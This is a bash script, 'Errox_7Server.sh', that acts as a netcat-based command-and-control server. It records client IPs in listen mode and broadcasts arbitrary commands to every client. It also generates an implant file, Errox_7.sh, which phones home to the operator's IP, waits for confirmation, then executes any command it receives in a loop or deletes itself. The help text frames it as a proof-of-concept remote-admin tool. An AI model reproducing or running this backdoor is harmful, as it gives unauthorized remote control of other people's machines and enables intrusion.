#!/bin/bash
#-LISTENING FOR THE INCOMING DATA-#
Listen()
{
	echo "Listening for connections..."
	#LISTENING ON PORT 80 FOR ANY INCOMING DATA#
	local data=$(sudo nc -l -p 80 | sed 's|/.*||')
	echo "Data collected"
	echo "$data"
	echo "$data" > clients.txt
	#A QUICK BUFFER SO THE RESPONSE ISNT BEING SENT BEFORE THE RECPITEANT ISNT AVALABLE#
	echo "Doing a quick buffer"
	sleep 1.75
	#SENDING A RESPONSE TO THE RECPITEANT SO THE FILE WONT BE DELETED#
	echo "Telling the sender a response"
	echo "true" | nc -q 1 $data 80
}
#-SENDING A COMMAND TO THE CLIENTS-#
Command()
{
	#GETTING THE COMMAND#
	echo "Enter command, type: Ctrl+D when done"
	command=""
	while IFS= read -r line; do
		command="$command$line"
	done
	#SEEING IF THE CLIENTS FILE EXISTS#
	currentDir=$(dirname "$0")
	file="clients.txt"
	path="$currentDir/$file"
	if [[ -e "$path" ]]; then
		echo "Command: $command"
		#IF IT DOES, READ FROM IT AND READ THE CONTENTS#
		clients=($(cat $path | tr -s '[:space:]' '\n' | awk '{for (i=1; i<=NF; i++) print $i}'))
		#LOOPING THROUGH EACH OF THE CLIENTS#
		for i in ${!clients[@]}; do
			#SENDING THEM THE COMMAND#
			echo "client: ${clients[$i]}"
			echo "$command" | nc -q 1 ${clients[$i]} 80
		done
	else
		#IF THE FILE DOESNT EXITS, SUGGEST RUNNING LISTEN MODE FIRST#
		echo "Clients file is empty, use Spread mode first"
	fi
}
#-CREATING Errox_7.sh AND HAVING IT MADE SO THAT THE CURRENT USER'S IP WILL BE THE ONE THAT THE FILE RESPONDS TO
CreateErrox()
{
	#CREATING THE FILE, ITS BARE BONES, BUT WORKS AS A POC#
	echo "#/bin/bash" > Errox_7.sh
	echo "host=\"$1\"" >> Errox_7.sh
	echo "echo \"\$(ip a | grep -E 'inet +[0-9]+.+[0-9]+.+[0-9]+.+[0-9]+/+[0-9]+ brd' | awk '{print \$2}' | grep -oE '^[^/]+')\" | nc -q 1 $host \$2" >> Errox_7.sh
	echo "response=\$(nc -l -p $2)" >> Errox_7.sh
	echo "if [[ '\$response' == 'true' ]]; then" >> Errox_7.sh
	echo "while true; do" >> Errox_7.sh
	echo "echo 'waiting for command.'" >> Errox_7.sh
	echo "command=\$(nc -l -p $2)" >> Errox_7.sh
	echo "\$command" >> Errox_7.sh
	echo "done" >> Errox_7.sh
	echo "else" >> Errox_7.sh
	echo 'rm "Errox_7.sh"' >> Errox_7.sh
	echo "fi" >> Errox_7.sh
}
#-STARTUP LOGIC, USED TO FIND WHAT MODE THE SCRIPT WILL RUN IN-#
if [[ $# == 0 ]]; then
	#A while true LOOP SO THAT IF THE USER INPUTS AN INVALID ANSWER, THE SCRIPT DOESNT END/CRASH#
	while true; do
		#PRINTING OUT THE MODES THE USER CAN USE
		echo "Which mode do you want to start in?"
		echo "Listen, Command (1/2)"
		read -p ">" choice
		if [[ $choice == 1 ]]; then
			Listen
			break
		elif [[ $choice == 2 ]]; then
			Command $command
			break
		elif [[ $choice == 3 ]]; then
			echo "Enter your ip:"
			read -p ">" userIP
			echo "Enter the port you want to use for connection:"
			read -p ">" userPort
			CreateErrox $userIP $userPort
		else
			echo "Enter valid selection."
			echo "For Listen type 1"
			echo "For Command type 2"
			echo "For Creating Errox type 3"
			echo ""
		fi
	done
elif [[ $1 == 1 ]]; then
	#RUNNING LISTEN MODE, IF THE USER PICKED THIS, THEY EITHER ARE USING THIS SOFTWARE FOR SOMETHING ELSE, OR THEY ARE DEBUGGIN AND ERROR I HAVENT FOUND#
	Listen
elif [[ $1 == 2 ]]; then
	#RUNNING COMMAND MODE#
	Command $2
elif [[ $1 == 3 ]]; then
	#RUNNING CREATE ERROX MODE#
	CreateErrox $2 $3
elif [[ $1 == "-help" ]]; then
	#HELP PAGE FOR USERS#
	echo "WARNING!"
	echo "THIS FILE IS OPTIMIZED FOR LAN NETWORKS AND HAS NOT BEEN TESTED ON ANY WLAN NETWORKS OR FORIN IPS"
	echo "THIS FILE HAS ONLY BEEN TESTEN ON THE eth0 INTERFACE AND NONE OTHERS, BE SURE TO CHANGE IF NEEDED"
	echo "Errox_7Server.sh and Errox_7.sh are files used in remote admin connection to a device as a POC, and need admin perms to run correctly"
	echo "Programed by: That1EthicalHacker"
	echo "---------------------------------------------------------------------------------------------------------------------------------"
	echo "               Options                |                               Affect"
	echo "--------------------------------------|------------------------------------------------------------------------------------------"
	echo "         ./Errox_7Server.sh 1         |               Will start in Listen mode"
	echo "./Errox_7Server.sh 2 'insert command' | Will start in command mode and use 'insert command'"
	echo "          ./Errox_7Server.sh          |             Will ask for which mode to use"
	echo "   ./Errox_7Server 3 'your ip' 'port' | Will create the Errox_7.sh file, using your ipv4 as host and any open port for connection"
	echo "---------------------------------------------------------------------------------------------------------------------------------"
else
	#FIRST TIME?#
	echo "Run './Errox_7Server.sh -help' for assistance"
fi
